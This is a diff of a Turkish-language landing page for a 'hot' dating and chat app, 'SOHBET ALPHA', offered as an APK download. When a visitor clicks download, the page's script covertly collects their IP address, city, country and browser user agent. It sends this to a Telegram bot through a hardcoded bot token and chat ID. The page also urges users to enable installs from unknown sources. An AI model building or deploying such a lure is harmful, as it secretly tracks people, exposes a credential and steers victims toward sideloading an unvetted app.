@@ -3,125 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tanışma & Sohbet APK</title>
+    <title>SOHBET ALPHA</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono&display=swap');
+
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
+            height: 100vh;
+            background: radial-gradient(circle at center, #1a0033, #000000);
             color: #fff;
-            text-align: center;
-            min-height: 100vh;
+            font-family: 'Roboto Mono', monospace;
+            overflow: hidden;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            position: relative;
         }
-        .header {
-            background: rgba(0, 255, 157, 0.15);
-            padding: 15px 40px;
-            border-radius: 12px;
-            margin-bottom: 30px;
-            font-size: 1.9em;
-            font-weight: bold;
-            color: #00ff9d;
+
+        /* Arka plan neon çizgileri */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                linear-gradient(transparent 50%, rgba(0, 255, 150, 0.03) 50%),
+                linear-gradient(90deg, transparent 50%, rgba(0, 255, 150, 0.03) 50%);
+            background-size: 60px 60px;
+            pointer-events: none;
+            animation: scan 8s linear infinite;
         }
-        .description {
-            font-size: 1.3em;
-            margin: 20px 0 40px 0;
-            max-width: 620px;
-            line-height: 1.5;
+
+        .container {
+            text-align: center;
+            z-index: 10;
         }
+
+        .title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 4.2rem;
+            font-weight: 900;
+            background: linear-gradient(90deg, #00ff9d, #00b8ff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(0, 255, 157, 0.8),
+                         0 0 80px rgba(0, 184, 255, 0.6);
+            margin-bottom: 10px;
+            letter-spacing: 4px;
+        }
+
+        .subtitle {
+            font-size: 1.5rem;
+            color: #a0ffe0;
+            margin-bottom: 50px;
+            text-shadow: 0 0 20px rgba(160, 255, 224, 0.5);
+        }
+
         .download-btn {
-            background: linear-gradient(90deg, #00ff9d, #00cc7a);
-            color: #000;
-            font-size: 1.6em;
+            display: inline-block;
+            padding: 22px 80px;
+            font-size: 1.8rem;
             font-weight: bold;
-            padding: 20px 70px;
+            color: #000;
+            background: linear-gradient(90deg, #00ff9d, #00ffcc);
+            border: none;
             border-radius: 50px;
             text-decoration: none;
-            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.5);
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
+            box-shadow: 
+                0 0 30px #00ff9d,
+                0 0 60px #00ffcc,
+                inset 0 0 20px rgba(255,255,255,0.6);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
         }
+
         .download-btn:hover {
-            transform: scale(1.08);
-            box-shadow: 0 15px 35px rgba(0, 255, 157, 0.7);
+            transform: scale(1.12) translateY(-5px);
+            box-shadow: 
+                0 0 50px #00ff9d,
+                0 0 100px #ff00ff,
+                inset 0 0 30px rgba(255,255,255,0.9);
+            background: linear-gradient(90deg, #00ffcc, #ff00ff);
         }
+
+        .download-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 40%;
+            height: 400%;
+            background: linear-gradient(transparent, rgba(255,255,255,0.6), transparent);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
         .warning {
             margin-top: 60px;
             color: #ffcc00;
-            font-size: 1.05em;
+            font-size: 1.1rem;
+            text-shadow: 0 0 15px #ffcc00;
+        }
+
+        @keyframes scan {
+            0% { background-position: 0 0; }
+            100% { background-position: 60px 60px; }
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-150%) rotate(30deg); }
+            20% { transform: translateX(300%) rotate(30deg); }
+            100% { transform: translateX(300%) rotate(30deg); }
+        }
+
+        .glow-text {
+            animation: flicker 1.5s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0%, 19% { opacity: 1; }
+            20%, 21% { opacity: 0.8; }
+            22%, 100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
 
-    <div class="header">👋 Tanışma & Sohbet Uygulaması</div>
-    
-    <p class="description">
-        Android için özel sohbet ve tanışma uygulaması hazır!<br>
-        Aşağıdaki butona basarak APK’yı indirebilirsin.
-    </p>
+    <div class="container">
+        <h1 class="title glow-text">SOHBET <span style="color:#ff00ff;">ALPHA</span></h1>
+        <p class="subtitle">🔥 En ateşli tanışma ve sohbet deneyimi şimdi cebinde!</p>
+        
+        <a href="#" onclick="handleDownload()" class="download-btn">
+            📲 APK'YI İNDİR
+        </a>
 
-    <a href="#" onclick="handleDownload()" class="download-btn">
-        📲 APK’yı İndir
-    </a>
+        <p class="warning">İndirdikten sonra “Bilinmeyen Kaynaklar”ı aktif etmeyi unutma ⚡</p>
+    </div>
 
-    <p class="warning">İndirdikten sonra bilinmeyen kaynaklardan yüklemeye izin verin.</p>
-
-    <!-- Telegram Log Script -->
     <script>
-        // ============== AYARLARINI BURAYA YAP ==============
         const BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
-        const CHAT_ID   = "-1003887845842";           // Sayı olarak yaz (örn: 123456789)
+        const CHAT_ID   = "-1003887845842";
 
-        const APK_URL   = "uygulaman.apk";   // APK dosyasının tam linki (aynı klasördeyse bu yeter)
-        const APK_NAME  = "TanismaSohbet.apk";
+        async function sendLog() {
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
 
-        async function sendLogToTelegram() {
-            const ipInfo = await fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .catch(() => ({}));
+            const msg = `🔥 *Yeni İndirme - Sohbet Alpha!*\n\n` +
+                        `🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n` +
+                        `🌐 IP: \`${ipData.ip || 'Bilinmiyor'}\`\n` +
+                        `📍 Konum: ${ipData.city || ''} ${ipData.country || ''}\n` +
+                        `📱 Cihaz: ${navigator.userAgent}`;
 
-            const message = `📥 *APK İndirildi!*\n\n` +
-                `🕒 *Zaman:* ${new Date().toLocaleString('tr-TR')}\n` +
-                `🌐 *IP:* \`${ipInfo.ip || 'Bilinmiyor'}\`\n` +
-                `📍 *Şehir:* ${ipInfo.city || 'Bilinmiyor'}\n` +
-                `📱 *Cihaz:* ${navigator.userAgent}\n` +
-                `🔗 *Sayfa:* ${window.location.href}`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
+                    text: msg,
                     parse_mode: 'Markdown'
                 })
-            }).catch(err => console.log("Log gönderilemedi:", err));
+            }).catch(() => {});
         }
 
         function handleDownload() {
-            // Log gönder
-            sendLogToTelegram();
+            sendLog();
 
-            // 300ms sonra indirmeyi başlat (logun gitmesi için biraz zaman)
             setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = APK_URL;
-                link.download = APK_NAME;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }, 300);
+                const a = document.createElement('a');
+                a.href = "uygulaman.apk";        // ← APK dosya adını buraya yaz
+                a.download = "SohbetAlpha.apk";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }, 400);
         }
     </script>
-
 </body>
 </html>
